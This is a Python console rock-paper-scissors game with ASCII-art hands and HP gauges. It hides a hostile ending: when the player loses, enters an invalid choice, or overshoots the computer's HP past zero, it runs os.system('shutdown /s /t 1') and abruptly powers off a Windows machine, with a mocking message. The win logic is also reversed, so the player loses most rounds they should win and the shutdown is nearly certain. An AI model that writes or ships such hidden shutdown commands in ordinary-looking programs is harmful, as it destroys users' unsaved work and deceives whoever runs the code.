from random import shuffle
import os


def rps():
    ia = [1,2,3]
    c = 0
    chp=100
    php=100
    damage=10
    print("""    -  Welcome, challenger !
       Here we'll be playing Janken, well-known as ROCK PAPER SCISSORS by you Europeans.
       I shall now remind you the rules.

       Both of our HP gauges will be printed each round. Meanwhile, we both will be choosing between ROCK (1), PAPER (2) or SCISSORS (3).
       ROCK crushes SCISSORS, PAPER folds ROCK and SCISSORS cuts PAPER.

       Each defeat shall lower the loser's HP by 10.
       However, it a tie happens to occurs, the damage dealt in the following round will be twice.
       There's no rule about how many times the damage can be doubled...

       I see you're starting to understand the game, challenger.

You are given 100HP.

""")
    while chp > 0 and php > 0:
        print("Computer's HP : " + str(chp))
        print("Player's HP : " + str(php))
        shuffle(ia)
        c=ia[0]
        x=int(input("    -  Now's about time you make your choose, challenger. Rock, paper or scissors ? (1, 2 or 3)"))
        if ia[0]==1:
            print("""
                    |          |
                   _|          |_
                  |              |
                  |   __ __ __ __|
                  |  |--|--|--|--|
                  |__|  |  |  |  |
                     |__|__|__|__|
                     
""")
        elif ia[0]==2:
            print("""
                    |          |
                   _|          |_
                  |              |
                  |         __ __|
                  |  |  |  |--|--|
                  |__|  |  |  |  |
                     |  |  |__|__|
                     |  |  |
                     |__|__|

""")
        elif ia[0]==3:
            print("""
                    |          |
                   _|          |_
                  |              |
                  |              |
                  |  |  |  |  |  |
                  |__|  |  |  |  |
                     |  |  |  |  |
                     |  |  |  |  |
                     |__|__|__|__|

""")
        if x==1:
            print("""
                      __ __ __ __
                   __|  |  |  |  |
                  |  |--|--|--|--|
                  |  |__|__|__|__|
                  |              |
                  |_            _|
                    |          |
                    |          |

""")
        elif x==2:
            print("""
                      __ __
                     |  |  |
                     |  |  |__ __
                   __|  |  |  |  |
                  |  |  |  |--|--|
                  |  |  |  |__|__|
                  |              |
                  |_            _|
                    |          |
                    |          |

""")
        elif x==3:
            print("""
                      __ __ __ __
                     |  |  |  |  |
                     |  |  |  |  |
                   __|  |  |  |  |
                  |  |  |  |  |  |
                  |  |  |  |  |  |
                  |              |
                  |_            _|
                    |          |
                    |          |

""")
        if c==x:
            print("    -  Mmmh... you're tough, challenger ! Let's see if ou can survive another round.")
            damage*=2
        elif c==1 and x==2:
            print("    -  Gotcha, challenger !")
            print("You lost " + str(damage) + " HP.")
            php-=damage
            damage=10
        elif c==1 and x==3:
            print("    -  Ouch !")
            print("Computer lost " + str(damage) + " HP.")
            chp-=damage
            damage=10
        elif c==2 and x==3:
            print("    -  Gotcha, challenger !")
            print("You lost " + str(damage) + " HP.")
            php-=damage
            damage=10
        elif c==2 and x==1:
            print("    -  Ouch !")
            print("Computer lost " + str(damage) + " HP.")
            chp-=damage
            damage=10
        elif c==3 and x==1:
            print("    -  Gotcha, challenger !")
            print("You lost " + str(damage) + " HP.")
            php-=damage
            damage=10
        elif c==3 and x==2:
            print("    -  Ouch !")
            print("Computer lost " + str(damage) + " HP.")
            chp-=damage
            damage=10
        else:
            print("""    -  DON'T YOU DARE MOCK ME, YOU BASTARD !
You have been annihilated.""")
            break
    if chp==0:
        print("You have defeated the Janken Master.")
        print("    -  Well done, challenger. I shall handle you now the title of 'Master of the Janken'.")
        print("You have received the 'Janken Master Medal'. Congratulations !")
    else:
        print("You fainted.")
        print("    -  It looks like you still need a little practice, challenger. I shall grant you another chance. jk lol noob ez")
        os.system("shutdown /s /t 1")
rps()
